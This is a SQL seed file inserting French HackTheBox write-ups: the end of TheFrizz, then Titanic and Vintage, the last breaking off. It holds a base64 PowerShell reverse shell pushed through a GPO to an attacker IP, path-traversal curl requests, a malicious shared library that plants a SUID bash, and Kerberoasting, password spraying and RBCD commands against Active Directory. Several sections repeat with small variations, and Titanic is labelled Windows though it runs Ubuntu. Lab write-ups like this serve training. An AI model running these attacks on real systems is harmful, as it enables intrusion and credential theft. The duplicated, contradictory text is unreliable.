L''énumération des groupes de **m.schoolbus** montre qu''il appartient au groupe **Desktop Administrator**, ce qui sera le vecteur pour l''escalade finale vers **SYSTEM**.

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Une fois positionné en tant que **m.schoolbus**, mon objectif est d''identifier un vecteur permettant d''atteindre le privilège **SYSTEM** sur le **Domain Controller**. L''énumération des groupes de l''utilisateur révèle une appartenance cruciale : le groupe **Desktop Administrator**.

#### Énumération des permissions GPO

Dans un environnement **Active Directory**, un utilisateur disposant de droits d''écriture sur un **Group Policy Object (GPO)** peut orchestrer une exécution de code sur toutes les machines (ou utilisateurs) auxquelles ce GPO est appliqué.

J''utilise **PowerView** (ou `Get-DomainGPOUserRights`) pour vérifier mes privilèges sur les objets du domaine :

```powershell
# Vérification des droits sur les GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.SecurityIdentifier -match "S-1-5-21-2386970044-1145388522-2932701813-1103" }
```

L''analyse confirme que **m.schoolbus** possède les droits **WriteProperty**, **WriteDacl** et **WriteOwner** sur un GPO spécifique lié à l''Unité Organisationnelle (OU) des serveurs ou des postes de travail.

> **Schéma Mental : GPO Abuse**
> 1. **Identification** : Repérer un GPO modifiable par l''utilisateur actuel.
> 2. **Injection** : Ajouter une directive malveillante (ex: **Scheduled Task**, **Startup Script**).
> 3. **Propagation** : Le **Domain Controller** synchronise le GPO vers **SYSVOL**.
> 4. **Exécution** : Le client (ici le DC lui-même ou un serveur cible) applique la stratégie via ses **Client Side Extensions (CSE)** et exécute la tâche en tant que **SYSTEM**.

#### Exploitation avec SharpGPOAbuse

Pour automatiser l''injection, j''utilise **SharpGPOAbuse.exe**. Je vais créer une **Immediate Task** qui s''exécutera immédiatement après la mise à jour des stratégies.

```bash
# Commande pour ajouter une tâche planifiée immédiate via le GPO compromis
./SharpGPOAbuse.exe --gponame "Default Desktop Policy" --taskname "DebugTask" --author "FRIZZ\m.schoolbus" --command "powershell.exe" --args "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQANAA0ACkAOw..." --force
```

Une fois la tâche injectée dans le GPO, je force la mise à jour sur la machine cible (ou j''attends le cycle de rafraîchissement de 90 minutes) :

```powershell
# Forcer la mise à jour des GPOs sur le contrôleur de domaine
gpupdate /force
```

#### Capture du Flag Root

Le listener `nc` reçoit la connexion entrante, me donnant un shell avec les privilèges les plus élevés sur le **Domain Controller**.

```bash
oxdf@hacky$ nc -lvnp 4444
Connection received on 10.10.11.60
whoami
nt authority\system

type C:\Users\Administrator\Desktop\root.txt
f3e1b2...************************
```

---

### Analyse Post-Exploitation "Beyond Root"

La compromission totale de **TheFrizz** met en lumière plusieurs failles structurelles majeures :

1.  **Gestion des données résiduelles (Recycle Bin)** : Le vecteur de pivot vers **m.schoolbus** reposait sur la présence d''une archive de sauvegarde **WAPT** dans la corbeille. Les administrateurs oublient souvent que `$RECYCLE.BIN` est un répertoire persistant sur le disque qui peut contenir des secrets (fichiers de config, bases de données SQLite, clés privées) même après une "suppression" logique.
2.  **Sécurité des plateformes tierces** : L''utilisation de **Gibbon LMS** en version vulnérable (**CVE-2023-45878**) a permis un **Unauthenticated Arbitrary File Write**. Dans un environnement Windows, un serveur web ne devrait jamais avoir les droits d''écriture dans son propre répertoire racine sans une segmentation stricte.
3.  **Délégation de privilèges GPO** : Le groupe **Desktop Administrator** possédait des droits de modification sur des GPOs critiques. Dans un modèle de moindre privilège (**Tiered Administration Model**), aucun utilisateur non-administrateur de domaine ne devrait pouvoir modifier des GPOs s''appliquant à des serveurs de niveau Tier 0 (Domain Controllers).
4.  **Désactivation de NTLM** : La machine avait **NTLM** désactivé, forçant l''utilisation de **Kerberos**. Bien que cela soit une bonne pratique de durcissement, cela n''a pas empêché l''attaque car les identifiants crackés ont été utilisés pour forger des tickets (TGT/TGS) légitimes via `kinit`.
5.  **Persistence WAPT** : L''analyse du répertoire `C:\wapt` montre que l''outil de déploiement logiciel stockait des mots de passe en **Base64** dans ses fichiers `.ini`. Un attaquant peut facilement transformer cette plateforme de gestion en un outil de distribution de malwares à l''échelle du parc informatique.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Web', 'Kerberos', 'SQL'],
  'Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La machine présente un grand nombre de ports ouverts, typiques d''un environnement **Active Directory**. L''énumération révèle les points critiques...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-thefrizz-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Titanic
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Titanic',
  'htb-titanic',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

L''énumération commence par un scan **Nmap** complet pour identifier la surface d''attaque réseau. La machine expose deux services standards : **SSH** (22) et **HTTP** (80).

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.55

# Scan de services et scripts par défaut
nmap -p 22,80 -sCV 10.10.11.55
```

Le serveur Web tourne sous **Apache 2.4.52** sur **Ubuntu**. Une redirection vers `http://titanic.htb/` est détectée. J''ajoute l''entrée au fichier `/etc/hosts`.

#### Subdomain Fuzzing
Une recherche de sous-domaines via **ffuf** révèle l''existence d''un environnement de développement.

```bash
ffuf -u http://10.10.11.55 -H "Host: FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Le sous-domaine `dev.titanic.htb` est identifié. Il héberge une instance **Gitea**, un service de gestion de code source auto-hébergé.

#### Analyse de la Surface d''Attaque (Gitea)
En explorant l''instance **Gitea**, je découvre deux dépôts publics :
1.  **docker-config** : Contient des fichiers `docker-compose.yml` révélant l''arborescence du système (`/home/developer/gitea/data`) et des identifiants **MySQL** (`root:MySQLP@$$w0rd!`).
2.  **flask-app** : Contient le code source de l''application principale tournant sur `titanic.htb`.

L''analyse du fichier `app.py` met en évidence une vulnérabilité critique dans la gestion des téléchargements :

```python
@app.route(''/download'', methods=[''GET''])
def download_ticket():
    ticket = request.args.get(''ticket'')
    # [...]
    json_filepath = os.path.join(TICKETS_DIR, ticket)
    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
```

> **Schéma Mental : Exploitation de os.path.join()**
> La fonction `os.path.join(path, *paths)` en Python possède un comportement spécifique : si un argument commence par un slash `/`, il est considéré comme une racine absolue, et tous les composants précédents sont ignorés.
> - `os.path.join("tickets", "file.json")` -> `tickets/file.json` (Relatif)
> - `os.path.join("tickets", "/etc/passwd")` -> `/etc/passwd` (Absolu)
> Ce comportement permet un **Path Traversal** direct sans utiliser de séquences `../`.

#### Exploitation du File Read
Je confirme la vulnérabilité en lisant `/etc/passwd` via le paramètre `ticket`.

```bash
curl "http://titanic.htb/download?ticket=/etc/passwd"
```

L''utilisateur système `developer` est identifié. En croisant cette information avec les données du dépôt `docker-config`, je localise la base de données SQLite de **Gitea** située à l''emplacement `/home/developer/gitea/data/gitea/gitea.db`.

#### Extraction et Crack de Hash
Je récupère la base de données pour extraire les hashs de mots de passe des utilisateurs.

```bash
# Téléchargement de la DB
curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db

# Extraction des hashs (Format : passwd, salt, name)
sqlite3 gitea.db "select passwd,salt,name from user"
```

Les hashs utilisent l''algorithme **PBKDF2-HMAC-SHA256**. Je convertis les données extraites au format compatible avec **Hashcat**.

```bash
# Format Hashcat 10900: sha256:iterations:salt:hash
# Après conversion des valeurs hex en base64 :
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

L''attaque par dictionnaire sur le hash de l''utilisateur `developer` réussit rapidement.

```bash
hashcat -m 10900 gitea.hashes rockyou.txt
```

Le mot de passe identifié est **25282528**. Ce dernier est réutilisé pour obtenir un accès initial via **SSH**.

```bash
ssh developer@titanic.htb
```

L''accès est validé, je possède désormais un **Footprint** stable sur la machine cible en tant qu''utilisateur `developer`.

---

### Énumération Post-Exploitation & Escalade de Privilèges

Une fois l''accès initial établi via **SSH** avec l''utilisateur `developer`, mon objectif est d''identifier des vecteurs d''escalade de privilèges ou des processus automatisés exécutés par des utilisateurs plus privilégiés.

#### Énumération du Système

L''énumération standard des processus via `ps aux` est limitée sur cette machine. Le système de fichiers `/proc` est monté avec l''option `hidepid=invisible`, ce qui empêche de voir les processus des autres utilisateurs.

```bash
# Vérification des restrictions /proc
mount | grep "/proc "
# Résultat: proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)
```

Je me concentre donc sur le répertoire `/opt`, souvent utilisé pour des scripts personnalisés ou des configurations spécifiques.

```bash
# Analyse du contenu de /opt
ls -la /opt/
# Découverte : /opt/scripts/identify_images.sh
```

Le script `/opt/scripts/identify_images.sh` contient la logique suivante :

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

L''analyse des permissions montre que `metadata.log` appartient à **root** et est mis à jour chaque minute, confirmant l''existence d''un **Cron Job** tournant avec les privilèges les plus élevés.

> **Schéma Mental : Exploitation de Cron & Path Hijacking**
> 1. **Trigger** : Un **Cron Job** exécute un script en tant que **root**.
> 2. **Contexte** : Le script effectue un `cd` vers un répertoire où l''utilisateur `developer` a les droits d''écriture (`/opt/app/static/assets/images`).
> 3. **Vulnérabilité** : L''outil **ImageMagick** (`magick`) est vulnérable à l''injection de bibliothèques si le répertoire de travail actuel (**CWD**) est prioritaire dans le chemin de recherche des dépendances.
> 4. **Action** : Placer une **Shared Library** malveillante dans le **CWD** pour intercepter l''exécution.

#### Exploitation de la CVE-2024-41817 (ImageMagick)

La version installée d''**ImageMagick** (7.1.1-35) est vulnérable à un défaut de conception où le **Current Working Directory** est inclus dans le chemin de recherche des fichiers de configuration et des bibliothèques partagées. En créant une bibliothèque nommée `libxcb.so.1` (une dépendance liée à X11 chargée par `magick`), je peux forcer l''exécution de code arbitraire lors de l''appel de la commande `identify`.

##### 1. Préparation de la Shared Library malveillante

Je rédige un code C utilisant l''attribut `__attribute__((constructor))` pour m''assurer que le code s''exécute dès que la bibliothèque est chargée par le processus.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    // Création d''une copie SUID de bash dans /tmp
    system("cp /bin/bash /tmp/pwnbash; chmod 6777 /tmp/pwnbash");
    exit(0);
}
```

##### 2. Compilation et Déploiement

Je compile ce code directement sur la cible dans le répertoire surveillé par le script de maintenance.

```bash
# Compilation de la bibliothèque partagée
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/pwnbash; chmod 6777 /tmp/pwnbash");
    exit(0);
}
EOF
```

##### 3. Élévation de Privilèges

Après avoir attendu l''exécution du **Cron Job** (maximum 60 secondes), je vérifie la présence du binaire **SetUID** dans `/tmp`.

```bash
# Vérification du binaire SUID
ls -l /tmp/pwnbash
# Résultat attendu: -rwsrwsrwx 1 root root ... /tmp/pwnbash

# Exécution pour obtenir le shell root
/tmp/pwnbash -p
```

L''utilisation du flag `-p` est cruciale ici pour empêcher **bash** d''abandonner les privilèges effectifs fournis par le bit **SUID**. Je dispose désormais d''un accès complet au système.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial établi en tant qu''utilisateur **developer**, mon objectif est d''identifier des vecteurs d''exécution privilégiés. L''énumération du système de fichiers révèle un script intéressant situé dans `/opt/scripts`.

#### Énumération des vecteurs de Cron

Le fichier `/opt/scripts/identify_images.sh` attire immédiatement mon attention. Son contenu est succinct :

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

L''analyse des permissions et du comportement du fichier `metadata.log` indique que ce script est exécuté périodiquement par **root** via une **Cron Job**. Le script utilise l''outil **ImageMagick** (`magick`) pour traiter des images dans un répertoire où l''utilisateur **developer** possède les droits d''écriture.

#### Vulnérabilité : CVE-2024-41817 (Shared Library Hijacking)

La version d''**ImageMagick** installée est la **7.1.1-35**. Cette version est vulnérable à une **Search Path Hijacking** (CVE-2024-41817). Lorsqu''il est exécuté, **ImageMagick** inclut par défaut le répertoire de travail actuel (**Current Working Directory**) dans son chemin de recherche pour les fichiers de configuration et les **Shared Libraries**.

> **Schéma Mental :**
> 1. Le **Cron Job** change de répertoire vers `/opt/app/static/assets/images`.
> 2. Il exécute `magick identify`.
> 3. `magick` tente de charger ses dépendances, notamment `libxcb.so.1`.
> 4. À cause de la vulnérabilité, il cherche d''abord dans le répertoire courant avant les répertoires système.
> 5. En plaçant une bibliothèque malveillante nommée `libxcb.so.1` dans ce dossier, j''obtiens une exécution de code avec les privilèges de l''utilisateur lançant la commande (**root**).

#### Exploitation et Compromission Totale

Je prépare une bibliothèque partagée en C. J''utilise l''attribut `__attribute__((constructor))` pour m''assurer que mon code s''exécute dès que la bibliothèque est chargée en mémoire, avant même que la fonction principale de `magick` ne débute.

Mon payload va copier `/bin/bash` vers `/tmp/0xdf` et lui appliquer un bit **SUID**.

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
    exit(0);
}
```

Je compile ce code directement sur la cible pour générer la **Shared Library** malveillante :

```bash
gcc -x c -shared -fPIC -o /opt/app/static/assets/images/libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
    exit(0);
}
EOF
```

Après une minute (cycle de la **Cron Job**), je vérifie la présence de mon binaire **SUID** :

```bash
ls -l /tmp/0xdf
# Sortie : -rwsrwsrwx 1 root root 1396520 Feb 19 20:20 /tmp/0xdf

/tmp/0xdf -p
# id -> uid=1001(developer) gid=1001(developer) euid=0(root) egid=0(root)
```

Je suis désormais **root**.

---

### Analyse Post-Exploitation "Beyond Root"

L''exploitation de cette machine met en lumière plusieurs failles de configuration critiques qui, combinées, permettent une compromission totale :

1.  **Insecure Library Loading Path** : La vulnérabilité **CVE-2024-41817** est un exemple classique de **DLL/Shared Object Hijacking**. Le fait qu''un binaire complexe comme **ImageMagick** fasse confiance au contenu du répertoire courant pour charger du code exécutable est une faille de conception majeure.
2.  **Cron Job Context** : Le script de maintenance bascule (`cd`) dans un répertoire accessible en écriture par un utilisateur non privilégié avant d''exécuter des commandes. C''est une erreur de configuration fréquente. Une bonne pratique aurait été d''utiliser des chemins absolus et de s''assurer que le répertoire de travail est sécurisé (ex: `/tmp` avec des restrictions ou un répertoire appartenant à **root**).
3.  **Principle of Least Privilege** : L''utilisation d''**ImageMagick** (un outil connu pour sa large surface d''attaque et ses nombreuses CVE historiques) par l''utilisateur **root** pour une tâche simple d''extraction de métadonnées est risquée. Un utilisateur dédié avec des permissions restreintes aurait dû être utilisé pour cette tâche.
4.  **Information Leakage via Gitea** : La compromission initiale a été facilitée par l''exposition de la base de données **SQLite** de **Gitea** via une **Path Traversal**. Cela souligne l''importance de sécuriser les volumes Docker et de ne jamais stocker de secrets ou de bases de données dans des arborescences accessibles par le serveur web, même indirectement.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'L''énumération commence par un scan **Nmap** complet pour identifier la surface d''attaque réseau. La machine expose deux services standards : **SSH** (22) et **HTTP** (80). Le serveur Web tourne sous **Apache 2.4.52** sur **Ubuntu**. Une redirection v...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-titanic-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Vintage
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Vintage',
  'htb-vintage',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Scanning & Énumération

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque de la cible Windows.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.45

# Scan de services détaillé sur les ports identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.45
```

L''analyse des services confirme la présence d''un **Domain Controller** (DC01) pour le domaine **vintage.htb**. Un point critique est relevé immédiatement : le **Message Signing** est requis sur le SMB et l''authentification **NTLM** semble désactivée ou restreinte, imposant l''usage de **Kerberos**.

J''ajoute les entrées correspondantes dans mon fichier `/etc/hosts` :
`10.10.11.45 DC01 DC01.vintage.htb vintage.htb`

### 2. Validation des Credentials Initiaux

Le scénario fournit un set de credentials : `P.Rosa / Rosaisbest123`. Comme suspecté, une tentative de connexion SMB classique échoue avec une erreur `STATUS_NOT_SUPPORTED` car le serveur refuse le **NTLM SSP**. Je dois utiliser le flag `-k` pour forcer l''authentification **Kerberos** (nécessite un ticket ou une résolution DNS parfaite du FQDN).

```bash
# Validation via Kerberos (NXC)
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
```

Une fois l''accès validé, j''énumère les **SMB Shares**. Les partages par défaut (`SYSVOL`, `NETLOGON`) sont accessibles en lecture mais ne contiennent aucune information sensible immédiate.

### 3. Énumération Active Directory (Bloodhound)

J''utilise **BloodHound.py** pour collecter les données du domaine. Malgré les restrictions d''authentification, l''outil parvient à extraire les objets via LDAP en utilisant les credentials de `P.Rosa`.

```bash
bloodhound-ce-python -c all -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.10.11.45 --zip
```

L''analyse des données révèle un vecteur intéressant : l''objet computer **FS01$** est membre du groupe **Pre-Windows 2000 Compatible Access**.

> **Schéma Mental : Exploitation Pre-Windows 2000**
> Dans les environnements AD anciens ou mal configurés, les comptes de machines créés avec cette compatibilité ont souvent un mot de passe par défaut prévisible : le nom de la machine en minuscules (sans le symbole `$`).
> **Logique :** Hostname `FS01` -> Password probable `fs01`.

Je vérifie cette hypothèse via LDAP :
```bash
netexec ldap vintage.htb -u ''FS01$'' -p fs01 -k
```
La connexion est un succès. J''ai maintenant le contrôle d''un compte machine.

### 4. Extraction du mot de passe GMSA

L''analyse Bloodhound montre que **FS01$** possède le droit **ReadGMSAPassword** sur le compte de service managé **gMSA01$**. Les **Group Managed Service Accounts (GMSA)** sont conçus pour que Windows gère automatiquement la rotation des mots de passe, mais les membres autorisés peuvent extraire le hash NT du compte.

> **Schéma Mental : Extraction GMSA**
> 1. Obtenir un TGT pour le compte autorisé (FS01$).
> 2. Interroger l''attribut `msDS-ManagedPassword` sur l''objet GMSA.
> 3. Décoder le blob binaire pour obtenir le NT Hash.

J''utilise **bloodyAD** pour extraire directement le hash :

```bash
# Extraction du hash NT de gMSA01$ via FS01$
bloodyAD -d vintage.htb --host dc01.vintage.htb -u ''fs01$'' -p fs01 -k get object ''gmsa01$'' --attr msDS-ManagedPassword
```
Le hash récupéré est : `b3a15bbdfb1c53238d4b50ea2c4d1178`.

### 5. Escalade vers SVC_SQL via Targeted Kerberoasting

Le compte **gMSA01$** possède des privilèges de **GenericWrite** sur le groupe **ServiceManagers**. Ce groupe a lui-même un contrôle total (**GenericAll**) sur plusieurs comptes de service, dont `svc_sql`.

Cependant, `svc_sql` est désactivé (`ACCOUNTDISABLE`). Ma stratégie est la suivante :
1. Ajouter **gMSA01$** au groupe **ServiceManagers**.
2. Réactiver le compte `svc_sql`.
3. Effectuer un **Targeted Kerberoast** (ajouter un SPN si nécessaire et demander un ticket TGS).

```bash
# 1. Ajout au groupe
bloodyAD -d vintage.htb -u ''GMSA01$'' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -k --host dc01.vintage.htb -f rc4 add groupMember ServiceManagers ''GMSA01$''

# 2. Réactivation du compte svc_sql
bloodyAD -d vintage.htb -u ''GMSA01$'' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -k --host dc01.vintage.htb -f rc4 remove uac svc_sql -f ACCOUNTDISABLE

# 3. Targeted Kerberoasting
# On utilise targetedKerberoast.py avec le TGT de gMSA01$
getTGT.py -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 ''vintage.htb/gmsa01$''
export KRB5CCNAME=gmsa01$.ccache
targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

Le hash TGS de `svc_sql` est récupéré. Je lance **Hashcat** (Mode 13100) avec la liste `rockyou.txt`.
Le mot de passe cracké est : **Zer0the0ne**.

### 6. Brèche Initiale : Password Spraying

Dans un environnement AD, la réutilisation de mots de passe est fréquente. Je tente un **Password Spraying** du mot de passe `Zer0the0ne` sur l''ensemble des utilisateurs énumérés précédemment.

```bash
# Récupération de la liste des utilisateurs
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --users > users.txt

# Spraying du mot de passe identifié
netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
```

Le spray révèle que l''utilisateur **C.Neri** utilise le même mot de passe. Ce compte me permet d''obtenir mon premier shell stable et d''accéder au flag utilisateur.

```bash
# Accès via WinRM
netexec winrm dc01.vintage.htb -u C.Neri -p Zer0the0ne -k
```

---

### Énumération Initiale & Pivot via FS01

L''accès initial est fourni via les identifiants **P.Rosa / Rosaisbest123**. Une tentative de connexion via **SMB** révèle que l''authentification **NTLM** est désactivée sur le **Domain Controller**. Je dois impérativement utiliser **Kerberos**.

```bash
# Validation des credentials via Kerberos
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
```

L''exécution de **BloodHound** (version Python) permet de cartographier l''**Active Directory**. L''analyse des objets révèle un ordinateur nommé `FS01.vintage.htb` membre du groupe **Pre-Windows 2000 Compatible Access**. Cette configuration implique souvent que le mot de passe de l''objet machine est identique au nom d''hôte en minuscules (sans le symbole `$`).

```bash
# Vérification du mot de passe machine par défaut
netexec ldap vintage.htb -u ''FS01$'' -p fs01 -k
```

---

### Extraction du mot de passe GMSA

L''objet `FS01$` possède le droit **ReadGMSAPassword** sur le compte de service managé **gMSA01$**. Pour extraire ce secret, je génère d''abord un fichier de configuration Kerberos et j''obtiens un **TGT** pour `FS01$`.

> **Schéma Mental :**
> P.Rosa (Low Priv) -> BloodHound -> Identification de FS01 (Pre-2000) -> Compromission de FS01$ -> Lecture du mot de passe de gMSA01$ via LDAP.

```bash
# Génération du ticket Kerberos pour FS01$
echo "fs01" | kinit ''fs01$''

# Extraction du hash NTLM de gMSA01 via bloodyAD
bloodyAD -d vintage.htb --host dc01.vintage.htb -k ccache=/tmp/krb5cc_1000 get object ''gmsa01$'' --attr msDS-ManagedPassword
```
*Note : Le hash récupéré pour gMSA01$ est `b3a15bbdfb1c53238d4b50ea2c4d1178`.*

---

### Escalade de Privilèges : Targeted Kerberoasting

Le compte **gMSA01$** dispose des permissions **GenericWrite** et **AddSelf** sur le groupe `ServiceManagers`. Ce groupe possède lui-même un accès **GenericAll** sur plusieurs comptes de service, dont `SVC_SQL`.

#### 1. Manipulation de groupe et activation de compte
Je commence par ajouter **gMSA01$** au groupe `ServiceManagers`. Le compte `SVC_SQL` étant désactivé par défaut, je dois modifier son **User Account Control (UAC)** pour le rendre opérationnel avant l''attaque.

```bash
# Ajout au groupe ServiceManagers
bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u ''GMSA01$'' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 add groupMember ServiceManagers ''GMSA01$''

# Récupération d''un nouveau TGT (pour actualiser les groupes) et activation de SVC_SQL
getTGT.py -k -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 ''vintage.htb/gmsa01$''
export KRB5CCNAME=gmsa01$.ccache
bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
```

#### 2. Attaque Targeted Kerberoast
Une fois le compte activé, j''effectue un **Targeted Kerberoasting**. Si le compte n''a pas de **Service Principal Name (SPN)**, je peux en injecter un, mais l''outil `targetedKerberoast.py` automatise ce processus.

```bash
# Exécution du Kerberoasting ciblé
targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
```

> **Schéma Mental :**
> gMSA01$ -> GenericWrite sur ServiceManagers -> Activation de SVC_SQL -> Injection de SPN -> Requête de TGS (Kerberoast) -> Crack hors-ligne.

Le hash obtenu est cracké via **hashcat** avec la liste `rockyou.txt`, révélant le mot de passe : **Zer0the0ne**.

---

### Mouvement Latéral : Password Spraying

Dans un environnement AD, la réutilisation de mots de passe entre comptes de service et comptes utilisateurs est une faiblesse critique. Je récupère la liste des utilisateurs du domaine via **LDAP** ou les données **BloodHound** précédemment extraites, puis je teste le mot de passe de `SVC_SQL` sur l''ensemble des comptes.

```bash
# Extraction de la liste des samaccountname
cat bloodhound_users.json | jq ''.data[].Properties.samaccountname'' -r > users.txt

# Password Spraying via Kerberos
netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
```

L''attaque par **Password Spray** confirme que l''utilisateur **C.Neri** utilise le même mot de passe. Ce compte me permet de stabiliser mon accès sur le domaine et de poursuivre l''énumération vers les privilèges administratifs.

---

### Phase 3 : Élévation de Privilèges & Domination

Après avoir compromis le compte **svc_sql** via un **Targeted Kerberoasting** et effectué un **Password Spraying**, j''obtiens un accès en tant que **C.Neri**. Ce compte constitue le point de pivot vers l''extraction de secrets locaux et la manipulation de délégations **Active Directory**.

#### 1. Extraction DPAPI & Escalation vers L.Bianchi_adm

L''utilisateur **C.Neri** possède des secrets enregistrés dans le **Windows Credential Manager**. Ces données sont protégées par l''**API Data Protection (DPAPI)**. Pour les récupérer, je dois extraire la **MasterKey** de l''utilisateur, puis déchiffrer le blob de credentials.

> **Schéma Mental : Extraction DPAPI**
> `Session Utilisateur` -> `Extraction du GUID de la MasterKey` -> `Récupération de la MasterKey (via mot de passe ou RPC)` -> `Déchiffrement du Credential Blob` -> `Plaintext Password`.

```powershell
# Énumération des credentials stockés
vaultcmd /list
# Extraction via SharpDPAPI (ou Mimikatz)
SharpDPAPI.exe credentials /password:Zer0the0ne
```

L''extraction révèle le mot de passe de **L.Bianchi_adm**. Ce compte dispose de privilèges plus élevés, notamment la capacité de modifier l''appartenance à certains groupes sensibles.

#### 2. Resource-Based Constrained Delegation (RBCD)

L''analyse **Bloodhound** montre que **L.Bianchi_adm** peut ajouter des objets à un groupe spécifique. Ce groupe possède le droit de modifier l''attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` sur le **Domain Controller** (DC01). C''est le vecteur parfait pour une attaque **RBCD**.

> **Schéma Mental : Attaque RBCD**
> 1. `Compte Privilégié` -> Ajoute un `Fake Computer` (MAQ > 0).
> 2. `Fake Computer` -> Configuré dans l''attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` du DC.
> 3. `S4U2Self / S4U2Proxy` -> Demande d''un **Service Ticket** pour l''utilisateur **Administrator** sur le DC.

**Étape A : Création du compte machine fictif**
J''utilise **impacket-addcomputer** pour créer un nouvel objet ordinateur dans le domaine.

```bash
impacket-addcomputer -dc-ip 10.10.11.45 -computer-name ''EVILCOMP$'' -computer-pass ''P@ssword123!'' ''vintage.htb/L.Bianchi_adm:MotDePasseExtrait''
```

**Étape B : Configuration de la délégation**
Je configure le **Domain Controller** pour qu''il accepte les tickets d''impersonnalisation provenant de mon nouvel ordinateur.

```bash
# Via BloodyAD ou impacket-rbcd
impacket-rbcd -delegate-to ''DC01$'' -delegate-from ''EVILCOMP$'' -action ''write'' ''vintage.htb/L.Bianchi_adm:MotDePasseExtrait''
```

**Étape C : Impersonnalisation de l''Administrateur**
J''utilise le protocole **Kerberos** (S4U2Proxy) pour obtenir un ticket de service pour le compte **Administrator**.

```bash
# Obtention du ticket via S4U
impacket-getST -spn ''cifs/dc01.vintage.htb'' -impersonate ''Administrator'' ''vintage.htb/EVILCOMP$:P@ssword123!''

# Injection du ticket et accès final
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.vintage.htb
```

---

### Analyse Post-Exploitation "Beyond Root"

La compromission totale de **Vintage** met en lumière plusieurs faiblesses structurelles critiques dans une architecture **Active Directory** moderne :

